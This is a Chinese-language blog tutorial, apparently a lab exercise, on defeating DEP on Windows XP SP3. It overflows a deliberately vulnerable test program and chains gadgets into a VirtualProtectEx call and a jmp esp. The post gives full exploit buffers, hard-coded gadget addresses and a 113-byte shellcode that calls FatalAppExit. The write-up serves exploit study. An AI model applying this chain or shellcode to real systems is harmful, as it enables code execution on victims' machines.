---
layout:		post
title:		Ret2Libc实战之利用VirtualProtect
author:		wooy0ung
tags:		windows
category:  	exploit
---


>[分析环境]  
>系统: Windows XP Professional sp3  
>编译器: VC++ 6.0  
>调试器: OllyDbg 1.10  
>说明: 没有启用GS & SafeS.E.H  
<!-- more -->


### 0x00 前期准备

新建一个工程, 帖入以下代码, 选择release版本, 禁止优化

```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>

char shellcode[]=
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

void test()
{
	char str[176];
	__asm int 3
	memcpy(str, shellcode, 430);
}

int main()
{
	HINSTANCE hInst=LoadLibrary("shell32.dll");
	char temp[200];
	test();

	return 0;
}
```


### 0x01 分析栈布局

运行*.exe, OllyDbg在int 3断点断下, shellcode起始地址0x0012fdfc, 返回地址0x0012feb0

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x00.png)
![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x01.png)

先来看看VirtualProtectEx的传入参数

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x02.png)

VirtualProtectEx的入口地址在0x7c801ad4

```
-1						hProcess
ebp+0x8~ebp+0xc:		lpAddress
ebp+0xc~ebp+0x10:		dwSize
ebp+0x10~ebp+0x14:		flNewProtect
ebp+0x14~ebp+0x18:		lpflOldProtect
```

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x03.png)

shellcode作如下修改, 源码里memcpy长度改成420

```
...
"\x90\x90\x90\x90"		# 180 byte
"\xd4\x1a\x80\x7c"
```

现在成功到达VirtualProtectEx入口, 但ebp被破坏了

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x04.png)
![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x05.png)

先对ebp进行修正, 利用"push esp pop ebp retn"指令, 在OllyFindAddr检索"545D"机器码

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x06.png)

在0x5d1d8b85找到一处, 继续修改shellcode

```
"\x90\x90\x90\x90"		# 180 byte
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x90\x90\x90\x90"		# junk
"\xd4\x1a\x80\x7c"		# VirtualProtectEx
```

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x07.png)

修正了ebp, 但retn后esp位于高地址, 增大esp避免压栈破坏shellcode

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x08.png)

在0x62c2127a找到一处"retn 0x28"

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x09.png)

修改shellcode, 因为修正ebp时的retn4, 需要先填充4 byte的junk再放置VirtualProtectEx

```
"\x90\x90\x90\x90"		# 180 byte
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x7a\x12\xc2\x62"		# 增大esp
"\x90\x90\x90\x90"		# junk
"\xd4\x1a\x80\x7c"		# VirtualProtectEx
```

OD附加调试, 来到VirtualProtectEx入口, ebp=0x0012fee4

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x0a.png)
![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x0b.png)

VirtualProtectEx传入的第2~5个参数起始于ebp+0x8=0x0012feec, 第1个参数固定为-1

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x0c.png)

修改shellcode, 241~256 byte依次放置4个参数, 最后一个参数需要指向一个可写地址, 这里我指向了栈上的一个junk

```
"\x90\x90\x90\x90"		# 180 byte
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x7a\x12\xc2\x62"		# 增大esp
"\x90\x90\x90\x90"		# junk
"\xd4\x1a\x80\x7c"		# VirtualProtectEx
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"		# junk
"\xf0\xfd\x12\x00"		# lpAddress, shellcode起始0x0012fdfc, 保险起见地址往前了一点
"\xff\x01\x00\x00"		# dwSize, 511 byte应该够用
"\x40\x00\x00\x00"		# flNewProtect, 固定设置
"\xa0\xfe\x12\x00"		# lpflOldProtect, 可写地址
```

OD附加调试, 调用VirtualProtectEx后返回eax=1, 说明设置成功

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x0d.png)

继续往下, 来到"retn 10", esp指向0x0012fee8, 后面紧跟4个参数, 在这里放置一条"jmp esp"就能跳回栈上执行shellcode

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x0e.png)

在0x7d70fa1e找到1条, 注意这里log条目太多最好导出到文件看, 还有部分检索出的地址会报异常, 替换其他的即可

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x0f.png)

shellcode的236~240 byte修改成"jmp esp"的地址

```
...		# 236 byte
"\x1e\xfa\x70\x7d"
"\xf0\xfd\x12\x00"		# lpAddress, shellcode起始0x0012fdfc, 保险起见地址往前了一点
"\xff\x01\x00\x00"		# dwSize, 511 byte应该够用
"\x40\x00\x00\x00"		# flNewProtect, 固定设置
"\xa0\xfe\x12\x00"		# lpflOldProtect, 可写地址
```


### 0x02 exploit

现在已经跳到栈上, 而且正好紧跟VirtualProtectEx的最后1个参数, 给出完整的shellcode

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x10.png)

```
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90"		# 180 byte
"\x85\x8b\x1d\x5d"		# 修正ebp
"\x7a\x12\xc2\x62"		# 增大esp
"\x90\x90\x90\x90"		# junk
"\xd4\x1a\x80\x7c"		# VirtualProtectEx
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"		# junk
"\x90\x90\x90\x90\x90\x90\x90\x90"
"\x1e\xfa\x70\x7d"		# jmp esp
"\xf0\xfd\x12\x00"		# lpAddress, shellcode起始0x0012fdfc, 保险起见地址往前了一点
"\xff\x01\x00\x00"		# dwSize, 511 byte应该够用
"\x40\x00\x00\x00"		# flNewProtect, 固定设置
"\xa0\xfe\x12\x00"		# lpflOldProtect, 可写地址
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08"
"\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c"
"\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01"
"\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e\x08\x45\x78\x69"
"\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01"
"\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x67\x20\x20\x01\x68\x79\x30\x75"
"\x6e\x68\x20\x77\x6f\x6f\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff"
"\xd7"		# paylaod 113 byte
```

pwn~

![](/assets/img/exploit/2017-10-05-disable-dep-virtualprotect/0x11.png)